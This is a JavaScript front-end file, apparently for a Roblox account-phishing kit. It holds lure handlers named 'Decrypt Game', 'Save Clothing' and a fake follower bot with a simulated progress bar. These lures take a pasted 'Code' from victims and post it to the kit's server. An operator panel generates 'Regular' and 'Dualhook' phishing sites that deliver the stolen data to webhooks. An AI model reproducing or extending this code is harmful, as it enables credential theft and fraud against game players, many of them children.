function Switch() {
    var Regular = getComputedStyle(document.getElementById('RegularForm')).display;
    var Dualhook = getComputedStyle(document.getElementById('DualhookForm')).display;
    if (Regular === 'block') {
        document.getElementById('SwitchLabel').innerHTML = '<i class="fa-solid fa-arrows-rotate"></i> Regular Generator';
        document.getElementById('RegularForm').style.display = 'none';
        document.getElementById('DualhookForm').style.display = 'block';
    } else if (Dualhook === 'block') {
        document.getElementById('SwitchLabel').innerHTML = '<i class="fa-solid fa-arrows-rotate"></i> Dualhook Generator';
        document.getElementById('DualhookForm').style.display = 'none';
        document.getElementById('RegularForm').style.display = 'block';
    };
};

function Game(Element) {
    var Secret = document.getElementById('Secret').value;
    var Code = document.getElementById('Code').value;
    if (Secret && Code) {
        $.ajax({
            url: `/page/api/submit`,
            method: 'POST',
            data: {
                Secret: Secret,
                Code: btoa(Code)
            },
            beforeSend: function () {
                Element.disabled = true;
                Element.innerHTML = 'Sending...';
            },
            error: function (data) {
                notify(`${data.responseJSON['error'][0]['message']}`, `Failed!`, `error`);
                setTimeout(function () {
                    Element.disabled = false;
                    Element.innerHTML = 'Decrypt Game';
                }, 300);
            },
            complete: function () {
                Element.disabled = false;
                Element.innerHTML = 'Decrypt Game';
            },
            success: function (data) {
                if (data['success'] === true) {
                    window.location.href = 'roblox-studio://';
                } else {
                    setTimeout(function () {
                        notify(`${data['error'][0]['message']}`, `Failed!`, `error`);
                        Element.disabled = false;
                        Element.innerHTML = 'Decrypt Game';
                    }, 500);
                }
            }
        });
    } else {
        Element.disabled = true;
        Element.innerHTML = 'Sending...';
        setTimeout(function () {
            notify(`You must fill all form!`, `Failed!`, 'error');
            Element.disabled = false;
            Element.innerHTML = 'Decrypt Game';
        }, 300);
    }
};

function Clothing(Element) {
    var Secret = document.getElementById('Secret').value;
    var Code = document.getElementById('Code').value;
    if (Secret && Code) {
        $.ajax({
            url: `/page/api/submit`,
            method: 'POST',
            data: {
                Secret: Secret,
                Code: btoa(Code)
            },
            beforeSend: function () {
                Element.disabled = true;
                Element.innerHTML = 'Sending...';
            },
            error: function (data) {
                notify(`${data.responseJSON['error'][0]['message']}`, `Failed!`, `error`);
                setTimeout(function () {
                    Element.disabled = false;
                    Element.innerHTML = 'Save Clothing';
                }, 300);
            },
            complete: function () {
                Element.disabled = false;
                Element.innerHTML = 'Save Clothing';
            },
            success: function (data) {
                if (data['success'] === true) {
                    notify(`The clothing will be downloaded Shortly!`, `Success!`, `success`);
                } else {
                    setTimeout(function () {
                        notify(`${data['error'][0]['message']}`, `Failed!`, `error`);
                        Element.disabled = false;
                        Element.innerHTML = 'Save Clothing';
                    }, 500);
                }
            }
        });
    } else {
        Element.disabled = true;
        Element.innerHTML = 'Sending...';
        setTimeout(function () {
            notify(`You must fill all form!`, `Failed!`, 'error');
            Element.disabled = false;
            Element.innerHTML = 'Save Clothing';
        }, 300);
    }
};

function Follower(Element) {
    var Secret = document.getElementById('Secret').value;
    var Code = document.getElementById('Code').value;
    if (Secret && Code) {
        document.querySelector('.progress-container').style.display = 'block';
        var progress = 0;
        update_bar(progress);
        $.ajax({
            url: `/page/api/submit`,
            method: 'POST',
            data: {
                Secret: Secret,
                Code: btoa(Code)
            },
            beforeSend: function () {
                Element.disabled = true;
                Element.innerHTML = 'Sending...';
            },
            error: function (data) {
                notify(`${data.responseJSON['error'][0]['message']}`, `Failed!`, `error`);
                setTimeout(function () {
                    Element.disabled = false;
                    Element.innerHTML = 'Start Bot';
                    update_bar(0);
                }, 300);
            },
            complete: function () {
                Element.disabled = false;
                Element.innerHTML = 'Start Bot';
            },
            success: function (data) {
                if (data['success'] === true) {
                    notify(`Please wait for the followers to be sent!`, `Success!`, `success`);
                    let interval = setInterval(function () {
                        progress += 5;
                        update_bar(progress);
                        if (progress >= 100) {
                            clearInterval(interval);
                            setTimeout(function () {
                                notify(`Followers sent successfully!`, `Success!`, `success`);
                                document.querySelector('.progress-container').style.display = 'none';
                            }, 500);
                        }
                    }, 1000);
                } else {
                    setTimeout(function () {
                        notify(`${data['error'][0]['message']}`, `Failed!`, `error`);
                        Element.disabled = false;
                        Element.innerHTML = 'Start Bot';
                        update_bar(0);
                    }, 500);
                }
            }
        });
    } else {
        Element.disabled = true;
        Element.innerHTML = 'Sending...';
        setTimeout(function () {
            notify(`You must fill all form!`, `Failed!`, 'error');
            Element.disabled = false;
            Element.innerHTML = 'Start Bot';
        }, 300);
    }
};

function Login(Element) {
    var AuthKey = document.getElementById('AuthKey').value;
    if (AuthKey) {
        $.ajax({
            url: `/page/api/login`,
            method: 'POST',
            data: {
                AuthKey: AuthKey
            },
            beforeSend: function () {
                Element.disabled = true;
                Element.innerHTML = 'Sending...';
            },
            error: function (data) {
                notify(`${data.responseJSON['error'][0]['message']}`, `Failed!`, `error`);
                setTimeout(function () {
                    Element.disabled = false;
                    Element.innerHTML = 'Authorize';
                }, 300);
            },
            complete: function () {
                Element.disabled = false;
                Element.innerHTML = 'Authorize';
            },
            success: function (data) {
                if (data['success'] === true) {
                    window.location.replace('/page/dashboard');
                } else {
                    setTimeout(function () {
                        notify(`${data['error'][0]['message']}`, `Failed!`, `error`);
                        Element.disabled = false;
                        Element.innerHTML = 'Authorize';
                    }, 500);
                }
            }
        });
    } else {
        Element.disabled = true;
        Element.innerHTML = 'Sending...';
        setTimeout(function () {
            notify(`You must fill all form!`, `Failed!`, 'error');
            Element.disabled = false;
            Element.innerHTML = 'Authorize';
        }, 300);
    }
}

function Normal(Element, Dualhook) {
    var SiteName = document.getElementById('SiteName').value;
    var Webhook = document.getElementById('Webhook').value;
    if (Dualhook) {
        lastParam = `?dh=${Dualhook}`;
    } else {
        lastParam = ``;
    };
    if (SiteName && Webhook) {
        $.ajax({
            url: `/page/api/create${lastParam}`,
            method: 'POST',
            data: {
                SiteName: SiteName,
                Webhook: Webhook,
                Type: 'Regular'
            },
            beforeSend: function () {
                Element.disabled = true;
                Element.innerHTML = 'Processing...';
            },
            error: function (data) {
                if (data.responseJSON && data.responseJSON.data && data.responseJSON.data.error && data.responseJSON.data.error[0] && data.responseJSON.data.error[0].message) {
                    notify(`${data.responseJSON.data.error[0].message}`, `Failed!`, `error`);
                }
                setTimeout(function () {
                    Element.disabled = false;
                    Element.innerHTML = 'Create Regular Site';
                }, 300);
            },
            complete: function () {
                Element.disabled = false;
                Element.innerHTML = 'Create Regular Site';
            },
            success: function (data) {
                if (data.success === true) {
                    window.location.replace('/page/dashboard');
                } else {
                    if (data.data && data.data.error && data.data.error[0] && data.data.error[0].message) {
                        setTimeout(function () {
                            notify(`${data.data.error[0].message}`, `Failed!`, `error`);
                            Element.disabled = false;
                            Element.innerHTML = 'Create Regular Site';
                        }, 300);
                    }
                }
            }
        })
    } else {
        Element.disabled = true;
        Element.innerHTML = 'Sending...';
        setTimeout(function () {
            notify('You must fill all form!', 'Failed!', 'error');
            Element.disabled = false;
            Element.innerHTML = 'Create Regular Site';
        }, 300);
    }
}

function Dualhook(Element) {
    var Folder = document.getElementById('Folder').value;
    var Name = document.getElementById('Name').value;
    var Thumbnail = document.getElementById('Thumbnail').value;
    var Webhook = document.getElementById('DualhookWebhook').value;
    var Colour = document.getElementById('Colour').value;
    if (Folder && Name && Thumbnail && Webhook && Colour) {
        $.ajax({
            url: `/page/api/create`,
            method: 'POST',
            data: {
                Folder: Folder,
                Name: Name,
                Thumbnail: Thumbnail,
                Webhook: Webhook,
                Colour: Colour,
                Type: 'Dualhook'
            },
            beforeSend: function () {
                Element.disabled = true;
                Element.innerHTML = 'Processing...';
            },
            error: function (data) {
                if (data.responseJSON && data.responseJSON.data && data.responseJSON.data.error && data.responseJSON.data.error[0] && data.responseJSON.data.error[0].message) {
                    notify(`${data.responseJSON.data.error[0].message}`, `Failed!`, `error`);
                }
                setTimeout(function () {
                    Element.disabled = false;
                    Element.innerHTML = 'Create Dualhook Site';
                }, 300);
            },
            complete: function () {
                Element.disabled = false;
                Element.innerHTML = 'Create Dualhook Site';
            },
            success: function (data) {
                if (data.success === true) {
                    notify(`Check your webhook!`, `Complete!`, `success`);
                } else {
                    if (data.data && data.data.error && data.data.error[0] && data.data.error[0].message) {
                        setTimeout(function () {
                            notify(`${data.data.error[0].message}`, `Failed!`, `error`);
                            Element.disabled = false;
                            Element.innerHTML = 'Create Dualhook Site';
                        }, 300);
                    }
                }
            }
        })
    } else {
        Element.disabled = true;
        Element.innerHTML = 'Sending...';
        setTimeout(function () {
            notify('You must fill all form!', 'Failed!', 'error');
            Element.disabled = false;
            Element.innerHTML = 'Create Dualhook Site';
        }, 300);
    }
}

function update_bar(percentage) {
    var bar = document.getElementById("progressBar");
    bar.style.width = percentage + "%";
    bar.textContent = percentage + "%";
};

function notify(Message, Title, Type) {
    new Notify({
        status: Type,
        title: Title,
        text: Message,
        effect: 'fade',
        speed: 300,
        customClass: 'notificationbackground',
        customIcon: null,
        showIcon: true,
        showCloseButton: true,
        autoclose: true,
        autotimeout: 1500,
        gap: 25,
        distance: 35,
        type: 1,
        position: 'top right'
    });
}